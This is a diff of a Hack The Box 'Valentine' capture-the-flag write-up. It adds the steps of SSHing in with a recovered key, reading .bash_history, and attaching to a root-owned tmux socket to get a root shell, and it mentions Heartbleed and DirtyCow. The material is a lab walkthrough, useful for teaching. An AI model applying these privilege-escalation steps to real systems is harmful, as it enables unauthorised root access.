@@ -3,12 +3,14 @@ title: HTB - Valentine Write-up
 author: bigb0ss
 date: 2020-11-15 19:36:00 +0800
 categories: [Hack The Box, Linux, Easy]
-tags: [hackthebox, valentine]
+tags: [hackthebox, valentine, openssl, heartbleed, tmux]
 image: /assets/img/post/htb/valentine/01_infocard.png
 ---
 
-This was an easy difficulty box. It was pretty easy and straight-forward box. Good learning path to:
-* 
+This was an easy difficulty box. Good learning path for:
+* OpenSSL Heartbleed Vulnerability
+* OpenSSL RSA Private Key Decrypt
+* Tmux Running as Root Privilege Escalation
 
 
 ## Initial Recon
@@ -141,7 +143,7 @@ RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
 -----END RSA PRIVATE KEY-----
 ```
 
-> **NOTE**: -r - reverse operation: convert (or patch) hexdump into binary; -p - Output in postscript continuous hexdump style. Also known as plain hexdump style
+> **NOTE**: -r - Reverse operation: convert (or patch) hexdump into binary; -p - Output in postscript continuous hexdump style. Also known as plain hexdump style
 
 
 ### Decrypt RSA Private Key (Heartbleed - CVE-2014-0160)
@@ -266,6 +268,8 @@ tpUEwXFAuMcDkksSNTLIJC2sa7eJFpHqeajJWAc30qOO1IBlNVoehxA=
 
 ### SSH (RSA Private Key)
 
+<b>user.txt</b>
+
 Using the decrypted SSH key, we can now SSH into box as `hype`.
 
 ```console
@@ -286,11 +290,53 @@ Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
 
 hype@Valentine:~$ id
 uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)
+
+hype@Valentine:~$ cd Desktop/
+hype@Valentine:~/Desktop$ ls
+user.txt
+hype@Valentine:~/Desktop$ cat user.txt 
+e671***REDACTED***1750
 ```
 
 ## Privilege Escalation
 
-### hype —> root
+### hype —> root (Tmux)
 
+In the `.bash_history` file, we can see the `hype` user attempted to connect to the `tmux` socket named `dev_sess`. And we enumerate the permission for the socket, it is owned by `root`.
 
+```console
+hype@Valentine:~$ cat .bash_history
 
+exit
+exot
+exit
+ls -la
+cd /
+ls -la
+cd .devs
+ls -la
+tmux -L dev_sess 
+tmux a -t dev_sess 
+tmux --help
+tmux -S /.devs/dev_sess 
+exit
+
+hype@Valentine:~$ ls -la /.devs/dev_sess 
+srw-rw---- 1 root hype 0 Nov 15 14:12 /.devs/dev_sess
+```
+<b>root.txt</b>
+
+Using the following command, we can simply attach to the existing `tmux` session of `dev_sess` and gain `root` access.
+
+```console
+$ tmux -S /.devs/dev_sess
+
+root@Valentine:/home/hype# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Valentine:/home/hype# cat /root/root.txt 
+f1bb***REDACTED***65b2
+```
+
+This host is also running with an older version of kernel so `DirtyCow` exploit will work as well. 
+
+Thanks for reading!
